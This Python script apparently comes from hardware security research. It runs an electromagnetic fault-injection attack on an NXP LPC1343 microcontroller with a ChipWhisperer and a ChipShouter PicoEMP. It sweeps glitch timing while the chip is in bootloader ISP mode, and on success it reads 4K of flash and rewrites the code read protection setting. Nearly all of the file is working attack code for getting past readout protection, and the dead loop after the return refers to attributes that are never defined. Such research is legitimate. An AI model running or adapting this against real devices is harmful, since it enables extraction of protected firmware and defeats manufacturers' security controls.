import sys
import time
import os
import numpy as np
import chipwhisperer as cw
from tqdm.notebook import tqdm
# import serial
import matplotlib.pyplot as plt

from collections import namedtuple
import lpc1343 as lpc1343
import external.nxpprog as nxpprog

import ChipShouterPicoEMP as csPicoEMP

# Define the initial minimum, maximum, and step values
offset_min_ns  = 1000
offset_max_ns  = 10000
offset_step_ns = 10
width_min_us   = 100
width_max_us   = 1000
width_step_us  = 10

class emfi():
    def __init__(self, _interface_option, _device_option, _reset_option, _off_min_ns = offset_min_ns, _off_max_ns = offset_max_ns, _off_step_ns = offset_step_ns, _wid_min_us = width_min_us, _wid_max_us = width_max_us, _wid_step_us = width_step_us):
        self.interface_option = _interface_option
        self.device_option = _device_option
        self.reset_option = _reset_option
        self.offset_min_ns  = _off_min_ns
        self.offset_max_ns  = _off_max_ns
        self.offset_step_ns = _off_step_ns
        self.width_min_us   = _wid_min_us
        self.width_max_us   = _wid_max_us
        self.width_step_us  = _wid_step_us

        self.scope = None

    def cw_lite_init(self):
        # disable logging
        cw.set_all_log_levels(cw.logging.CRITICAL)

        # ------------------------------
        # Initiate Connection to the Chipwhisperer Lite Kit
        print("Connecting to CW_Lite.")
        scope = cw.scope()
        self.scope = scope
        try:
            if not self.scope.connectStatus:
                self.scope.con()
        except NameError:
            self.scope = cw.scope()
        print("INFO: Found ChipWhisperer😍")
        time.sleep(0.05)
        # scope.default_setup()

    def cw_lite_config(self):
        # Initializing the cwLite configurations
        self.target = cw.target(self.scope)
        # Original attack done with 100 MHz clock - can be helpful to run this
        # 2x faster to get better resolution, which seems useful for glitching certain boards.
        # But if you want to use DPA you need to leave this set to '1'
        self.freq_multiplier = 1

        #Initial Setup
        self.scope.adc.samples = 10000
        self.scope.adc.offset = 0
        self.scope.clock.adc_src = "clkgen_x1"
        self.scope.trigger.triggers = "tio4"        # Trigger on a rising edge of TIO4 (connected to DIO6)
        self.scope.adc.basic_mode = "rising_edge"
        # this value is for CW-Lite/Pro; for CW-Husky, refer to Fault 1_1
        self.scope.clock.clkgen_freq = 100000000 * self.freq_multiplier      # Main ChipWhisperer clock
        self.scope.glitch.clk_src = "clkgen"
        self.scope.glitch.trigger_src = "ext_single"
        self.scope.glitch.output = "enable_only"
        if self.device_option == 'lpc1343':
            self.scope.io.tio1 = "serial_rx"
            self.scope.io.tio2 = "serial_tx"
            self.scope.glitch.width = 40

            # target.baud = 38400
            # target.key_cmd = ""
            # target.go_cmd = ""
            # target.output_cmd = ""
        else:
            return 0
    
    def cw_PicoEMP_config(self):
        # For use with the ChipShouter Pico
        # Disable the glitch mosfet and route the glitch signal to hs2
        # Connect HS2 to the ChipShouter Pico HVP pin
        self.scope.io.glitch_lp = False
        self.scope.io.glitch_hp = False
        self.scope.io.hs2 = "glitch"
        # scope.glitch.ext_offset = 300         # Glitch offset from the external trigger (in cycles of the main CW clock)
        # scope.glitch.repeat = 100             # You might want to try different values for this parameter

        # Set tio3 to be an input
        # Connect tio3 to the CHG pin, this allows us to check if the ChipShouter is charged
        self.scope.io.tio3 = 'high_z'
        print(self.scope.io.tio_states[2])

    def cw_PicoEMP_settings_config(self):
        # Initializing cwLite Glitch attack parameters' settings
        if self.device_option == 'lpc1343':
            # Range = namedtuple("Range", ["min", "max", "step"])
            # self.offset_range = Range(4800*self.freq_multiplier, 4900*self.freq_multiplier, 1)
            # self.repeat_range = Range(80, 300, 1)
            # self.scope.glitch.width = 40
            # self.scope.glitch.repeat = self.repeat_range.min

            self.gc = cw.GlitchController(groups=["success", "reset", "normal"], parameters=["ext_offset", "repeat"])
            self.gc.set_global_step(1)
            # self.gc.set_range("ext_offset", 110000, 130000)      # Time after trigger to glitch, in CW clock cycles. # successful for nRF52833
            # self.gc.set_range("repeat", 5000, 8190)              # Length of the glitch pulse    # successful for nRF52833
            # self.gc.set_range("ext_offset", 4890, 4900)      # Time after trigger to glitch, in CW clock cycles. # successful for lpc1343
            # self.gc.set_range("ext_offset", 4895, 4905)      # Time after trigger to glitch, in CW clock cycles. # successful for lpc1343
            
            # EMFI Attack is alittle slower than the voltage FI Attack
            # According to real-time observations, the actual effect of the EMFI attack occurs 1.1 micro-second later than of the VFI
            # So, Starting from the reset trigger, we set the offset before attack to 1.1 micro-second earlier than the VFI settings
            # to compensate the delay in effect in EMFI case
            self.gc.set_range("ext_offset", (4890-110), (4900-110))      # Time after trigger to glitch, in CW clock cycles. # successful for lpc1343
            # self.gc.set_range("repeat", 50, 400)              # Length of the glitch pulse    # testing for lpc1343
            # self.gc.set_range("repeat", 50, 200)              # Length of the glitch pulse    # testing for lpc1343
            self.gc.set_range("repeat", 100+20, 200)              # Length of the glitch pulse    # testing for lpc1343
            # self.gc.set_step("repeat", 10)
            self.gc.set_step("repeat", 1)
            # gc.set_step("ext_offset", 50)

    def cw_PicoEMP_fi_loop(self, _pico):
        # Running Glitch Attack
        if self.device_option == 'lpc1343':
            print("Attempting to Electromagnetic glitch LPC Target")
            _pico.arm()

            # self.scope.io.target_pwr = False
            # time.sleep(0.2)
            # self.scope.io.target_pwr = True
            # time.sleep(0.2)
            self.reset_dut_full(0.2)

            nxpdev = lpc1343.CWDevice(self.scope, self.target)
            nxpdev.isp_mode()

            done = False

            for glitch_setting in self.gc.glitch_values():
                self.scope.glitch.ext_offset = glitch_setting[0]
                self.scope.glitch.repeat = glitch_setting[1]
                self.wait_for_hv()          # Wait for the ChipShouter to be charged
                # Perform target reset & glitch arm
                self.scope.io.nrst = 'low'
                time.sleep(0.05)
                self.scope.arm()
                self.scope.io.nrst = 'high'
                self.target.ser.flush()
                
                print("Glitch offset %4d, width %d........"%(self.scope.glitch.ext_offset, self.scope.glitch.repeat), end="")

                time.sleep(0.05)
                try:
                    nxpp = nxpprog.NXP_Programmer("lpc1114", nxpdev, 12000)
                    # print("nxpp programmer initialized.")
                    try:
                        data = nxpp.read_block(0, 4)            
                        print("[SUCCESS]\n")
                        print("  Glitch OK! Reading first 4K...")
                        block = None
                        #Deal with crappy ChipWhisperer serial buffer by splitting read up
                        for i in range(0, 4096, 32):
                            if block is None:
                                block = nxpp.read_block(i, 32)
                            else:
                                block += nxpp.read_block(i, 32)
                        
                        print("  Adjusting CRP...")
                        block = [ord(t) for t in block]
                        lpc1343.set_crp(nxpp, 0, block)
                        done = True
                        break

                    except IOError:
                        # print("[NORMAL]")
                        print("[NORMAL] - Serial Number: ", nxpp.get_serial_number())
            
                except IOError:
                    print("[FAILED]")
                    pass
            
            _pico.disarm()
            return 0
            ###############

            while done == False:
                self.scope.glitch.ext_offset = self.offset_range.min
                if self.scope.glitch.repeat >= self.repeat_range.max:
                    self.scope.glitch.repeat = self.repeat_range.min
                while self.scope.glitch.ext_offset < self.offset_range.max:
                    self.wait_for_hv()          # Wait for the ChipShouter to be charged
                    # Perform target reset & glitch arm
                    self.scope.io.nrst = 'low'
                    time.sleep(0.05)
                    self.scope.arm()
                    self.scope.io.nrst = 'high'
                    self.target.ser.flush()
                    
                    print("Glitch offset %4d, width %d........"%(self.scope.glitch.ext_offset, self.scope.glitch.repeat), end="")

                    time.sleep(0.05)
                    try:
                        nxpp = nxpprog.NXP_Programmer("lpc1114", nxpdev, 12000)

                        try:
                            data = nxpp.read_block(0, 4)            
                            print("[SUCCESS]\n")
                            print("  Glitch OK! Reading first 4K...")
                            block = None
                            #Deal with crappy ChipWhisperer serial buffer by splitting read up
                            for i in range(0, 4096, 32):
                                if block is None:
                                    block = nxpp.read_block(i, 32)
                                else:
                                    block += nxpp.read_block(i, 32)
                            
                            print("  Adjusting CRP...")
                            block = [ord(t) for t in block]
                            lpc1343.set_crp(nxpp, 0, block)
                            done = True
                            break

                        except IOError:
                            print("[NORMAL]")
                
                    except IOError:
                        print("[FAILED]")
                        pass
                
                    self.scope.glitch.ext_offset += self.offset_range.step
                self.scope.glitch.repeat += self.repeat_range.step
            _pico.disarm()
        else:
            return 0

    # Simple loop that blocks until the ChipShouter is charged
    def wait_for_hv(self):
        while self.scope.io.tio_states[2] != 0:
            time.sleep(0.1)

    # Full reset the target microcontroller
    def reset_dut_full(self, delay=0.1):
        self.scope.io.nrst = 'low'
        self.scope.io.target_pwr = False
        time.sleep(delay)
        self.scope.io.target_pwr = True
        self.scope.io.nrst = 'high'
        time.sleep(0.05)
        # ser.flushInput()
        # ser.write(b'd') # To select the double loop function of the firmware

    # Reset the target microcontroller - Only reset line
    def reset_dut(self, delay=0.1):
        self.scope.io.nrst = 'low'
        time.sleep(delay)
        self.scope.io.nrst = 'high'
        time.sleep(0.05)

    def run(self):
        self.cw_lite_init()
        self.cw_lite_config()
        self.cw_PicoEMP_config()
        self.cw_PicoEMP_settings_config()

        # pico = csPicoEMP.ChipShouterPicoEMP('/dev/ttyACM1')
        pico = csPicoEMP.ChipShouterPicoEMP('/dev/ttyACM0')
        pico.setup_external_control()

        self.reset_dut()

        self.cw_PicoEMP_fi_loop(pico)






        


